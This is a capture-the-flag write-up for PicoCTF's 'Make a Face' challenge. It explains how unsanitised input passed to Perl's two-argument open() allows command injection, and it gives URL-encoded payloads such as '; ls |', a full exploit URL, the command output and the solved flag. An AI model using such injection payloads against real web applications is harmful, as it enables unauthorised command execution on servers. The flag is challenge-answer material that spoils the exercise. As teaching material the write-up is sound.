## Make a Face
This challenge is from Pico CTF. We are given a link to a web application built using Perl. Our goal is to find any vulnerability in the perl script so that we can execute shell in the server. 

After some googling, it is easy to find out that perl's (2-arguments form) ```open(FILEHANDLER, filename)``` function has a security flaw: luckily, several ```open()``` functions appear in the source code. 
```
  open(HEAD,"head".$q->param('Head'));
  open(HAIR,"hair".$q->param('Hair'));
  open(NOSE,"nose".$q->param('Nose'));
  open(MOUTH,"mouth".$q->param('Mouth'));
  open(EYES,"eyes".$q->param('Eyes'));
```

The security flaw here is that the second argument of these ```open()``` functions comes from user input which is not sanitized at all. A normal usage through the browser would not trigger any vulnerability; however, it is possible that a user sends arbitrary data that may not correspond with the data types specified in html and/or javascript. See the following code block that creates the form

```
$q->table(
    $q->Tr($q->td([$q->b("Head"),$q->input({-name=>"Head",-type=>'range',-min=>1,-max=>4})])),
    $q->Tr($q->td([$q->b("Hair"),$q->input({-name=>"Hair",-type=>'range',-min=>0,-max=>2})])),
    $q->Tr($q->td([$q->b("Nose"),$q->input({-name=>"Nose",-type=>'range',-min=>1,-max=>3})])),
    $q->Tr($q->td([$q->b("Mouth"),$q->input({-name=>"Mouth",-type=>'range',-min=>1,-max=>3})])),
    $q->Tr($q->td([$q->b("Eyes"),$q->input({-name=>"Eyes",-type=>'range',-min=>1,-max=>3})]))
   ),
```
The input type of these variables are set to ```range```, but we can set these variables to anything we want using ```curl``` or any other means. 

Let's get back to the vulnerablity in the ```open(FILEHANDLER, filename)``` function. If the filename begins with "|", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a "|", the filename is interpreted as a command which pipes output to us. So we can run any shell command in that directory of the filename. What we should pay attension to is that we have strings attached before our input, for example, "nose" for ```open(NOSE,"nose".$q->param('Nose'));```. To overcome this nuisance, we can simply attach ";" before the our input, so that ```nose;``` will be read as a command (obviously invalid), followed by the command that we supply. 

Also we must understand how user input is sent over to the server (the CGI script). Taking a look at the line ```<script src="/js.js" type="text/javascript"></script>``` and checking the content of ```js.js```, we see the following snippet. 
```
 var image = new Image();
  image.src = "index.cgi?Head="+head.value+".bmp&Hair="+hair.value+".bmp&Nose="+nose.value+".bmp&Mouth="+mouth.value+".bmp&Eyes="+eyes.value+".bmp";
```
So our data is sent to the CGI script using GET method through URL. Since we are using special characters "|", " " and ";", we have to URL encode our input. Say we want to see the inside of the directory by issuing the command "ls". We can achieve this by supplying "; ls |", which is url-encoded to "%3Bls%20%7C". 

This is not complete though. Another small complication lies in the block
```
  while (read(HEAD,$headb,1)) {
    read(HAIR,$hairb,1);
    read(NOSE,$noseb,1);
    read(MOUTH,$mouthb,1);
    read(EYES,$eyesb,1);
    print (chr (ord($headb)&ord($hairb)&ord($noseb)&ord($mouthb)&ord($eyesb)));
  }
```

```ord()``` function returns the numerical (ASCII) value of the first character in the string, while ```chr()``` does the opposite. So what this loop does is that it enumerates through all the chracters in the string, perform Bitwise AND on the numerical values of the characters in corresponding indices, and then convert the result back to a character. This is easy to bypass - we just set all the user inputs to the exact same input.  

Now let's exploit. Simply feed the following URL.
```
http://makeaface.picoctf.com/index.cgi?Head=%3Bls%20%7C&Hair=%3Bls%20%7C&Nose=%3Bls%20%7C&Mouth=%3Bls%20%7C&Eyes=%3Bls%20%7C
```
This will return us a corrupted .bmp file. That's fine, just change the extension to .txt, and we can see the output of the "ls" command. The first result looks interesting
```
SECRET_KEY_2b609783951a8665d8c67d721b52b0f8
css.css
eyes1.bmp
eyes2.bmp
eyes3.bmp
eyes4.bmp
hair0.bmp
hair1.bmp
hair2.bmp
head1.bmp
head2.bmp
head3.bmp
head4.bmp
index.cgi
js.js
mouth1.bmp
mouth2.bmp
mouth3.bmp
nose1.bmp
nose2.bmp
nose3.bmp
```
So let's ```cat``` and see its content. This time, the command we want to feed is ```; cat SECRET_KEY_2b609783951a8665d8c67d721b52b0f8 |```, which is equivalent to ```%3B%20cat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8%20%7C```. Do the same as before, and open the txt file. 
The flag is ```why_did_we_stop_using_perl_again?```
